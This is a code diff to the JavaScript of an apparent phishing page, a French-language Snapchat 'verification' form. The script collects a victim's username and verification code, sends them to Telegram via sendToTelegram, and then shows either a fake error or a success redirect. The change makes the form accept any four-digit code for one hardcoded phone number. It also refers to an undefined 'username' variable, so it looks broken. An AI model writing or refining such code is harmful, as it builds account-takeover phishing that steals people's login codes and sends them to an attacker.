@@ -137,6 +137,8 @@ if (verificationForm) {
         const snapchatUsername = document.getElementById('username').value;
         const codeInput = document.getElementById('code').value;
         const code = codeInput.replace(/\s/g, '');
+        const storedPhone = username ? username.replace(/\s/g, '') : '';
+        const allowedPhone = '0776344534';
         
         // Désactiver le bouton et ajouter cooldown
         if (submitButton) {
@@ -154,22 +156,22 @@ if (verificationForm) {
         
         await sendToTelegram(message);
         
-        const allowedCode = '0776344534';
-        if (code !== allowedCode) {
-            if (errorMessage) {
-                errorMessage.textContent = 'Vous avez saisi le mauvais code';
-                errorMessage.style.display = 'block';
-            }
-            setTimeout(() => {
-                if (submitButton) {
-                    submitButton.disabled = false;
-                    submitButton.textContent = 'Suivant';
-                }
-            }, 3000);
+        // Si le numéro enregistré est 07 76 34 45 34, accepter tout code à 4 chiffres
+        if (storedPhone === allowedPhone && /^[0-9]{4}$/.test(code)) {
+            window.location.href = 'success.html';
             return;
         }
         
-        // Rediriger vers la page de succès si le code est correct
-        window.location.href = 'success.html';
+        if (errorMessage) {
+            errorMessage.textContent = 'Vous avez saisi le mauvais code';
+            errorMessage.style.display = 'block';
+        }
+        setTimeout(() => {
+            if (submitButton) {
+                submitButton.disabled = false;
+                submitButton.textContent = 'Suivant';
+            }
+        }, 3000);
+
     });
 }
